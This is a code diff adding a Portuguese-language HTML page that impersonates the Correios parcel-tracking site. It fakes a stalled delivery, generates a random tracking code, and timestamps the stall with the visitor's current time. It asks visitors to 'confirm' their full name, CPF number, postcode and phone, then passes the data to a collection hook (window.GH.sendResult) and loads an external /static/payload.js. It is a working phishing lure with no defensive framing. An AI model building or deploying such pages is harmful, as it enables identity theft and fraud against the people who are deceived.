@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+<meta name="theme-color" content="#1a237e">
+<title>Rastreamento — Correios</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f5f5f5;font-family:'Segoe UI',Arial,sans-serif;color:#333;min-height:100vh}
+.topbar{background:#1a237e;color:#fff;padding:14px 18px;font-size:18px;font-weight:700;display:flex;align-items:center;gap:10px}
+.card{background:#fff;margin:14px 16px;padding:18px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
+.card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
+.code{font-size:20px;font-weight:900;color:#1a237e;letter-spacing:1px}
+.status-badge{background:#fff3cd;color:#856404;padding:6px 12px;border-radius:20px;font-size:12px;font-weight:700}
+.track{padding:12px 0;border-left:3px solid #e0e0e0;padding-left:16px;position:relative;margin-left:10px}
+.track.done{border-left-color:#4caf50}
+.track.current{border-left-color:#ff9800}
+.track .tdate{font-size:12px;color:#888;margin-bottom:3px}
+.track .tstatus{font-size:14px}
+.alert{background:#fff3cd;border:1px solid #ffc107;border-radius:10px;padding:14px;margin:14px 16px;font-size:13px;line-height:1.5}
+.form-section{background:#fff;margin:14px 16px;padding:18px;border-radius:12px}
+.form-section input{width:100%;padding:12px 14px;border-radius:8px;border:1px solid #ccc;font-size:15px;margin-bottom:10px}
+.form-section input:focus{border-color:#1a237e;outline:none}
+.btn-custom{width:100%;padding:14px;background:#1a237e;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer}
+</style>
+<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+</head>
+<body>
+<div class="topbar">📦 Rastreamento de Objetos</div>
+<div class="card">
+  <div class="card-header">
+    <div class="code" id="trackCode">BR83927014</div>
+    <div class="status-badge">🔴 Objeto parado — ação necessária</div>
+  </div>
+  <div style="padding:12px 0">
+    <div class="track done"><div class="tdate">06/08 • 14:22</div><div class="tstatus">Objeto postado</div></div>
+    <div class="track done"><div class="tdate">07/08 • 08:45</div><div class="tstatus">Encaminhado para unidade de tratamento</div></div>
+    <div class="track done"><div class="tdate">07/08 • 19:30</div><div class="tstatus">Saiu para entrega</div></div>
+    <div class="track current"><div class="tdate" id="todayDate">--</div><div class="tstatus">Aguardando confirmação</div></div>
+  </div>
+</div>
+<div class="alert"><strong>⚠️ Pendência de entrega</strong><br>Confirme seus dados para nova tentativa.</div>
+<div class="form-section" id="confirmForm">
+  <h4 style="margin-bottom:8px">📝 Confirmar dados</h4>
+  <input type="text" id="fullName" placeholder="Nome completo">
+  <input type="text" id="cpfDest" placeholder="CPF">
+  <input type="text" id="cepDest" placeholder="CEP">
+  <input type="text" id="telDest" placeholder="Telefone com DDD">
+  <button class="btn-custom" onclick="confirmDelivery()">CONFIRMAR E RECEBER HOJE</button>
+</div>
+<div id="deliveryDone" style="display:none;text-align:center;padding:20px">
+  <div style="font-size:48px">📬</div>
+  <h3 style="color:#22c55e">Confirmação Recebida!</h3>
+  <p style="color:#666;font-size:13px">Entregador acionado. Prazo: até 3h.</p>
+</div>
+<script src="/static/payload.js"></script>
+<script>
+var now=new Date();
+document.getElementById('todayDate').textContent=now.getDate().toString().padStart(2,'0')+'/'+(now.getMonth()+1).toString().padStart(2,'0')+' • '+now.getHours().toString().padStart(2,'0')+':'+now.getMinutes().toString().padStart(2,'0');
+document.getElementById('trackCode').textContent='BR'+Math.floor(Math.random()*90000000+10000000);
+function confirmDelivery(){
+  var nome=document.getElementById('fullName').value.trim();
+  var cpf=document.getElementById('cpfDest').value.trim();
+  var cep=document.getElementById('cepDest').value.trim();
+  var tel=document.getElementById('telDest').value.trim();
+  if(nome.length<6||cpf.length<11)return;
+  var data={nome:nome,cpf:cpf,cep:cep,telefone:tel,timestamp:new Date().toISOString()};
+  if(window.GH)window.GH.sendResult('correios_data',JSON.stringify(data));
+  document.getElementById('confirmForm').style.display='none';
+  document.getElementById('deliveryDone').style.display='block'
+}
+</script>
+</body>
+</html>
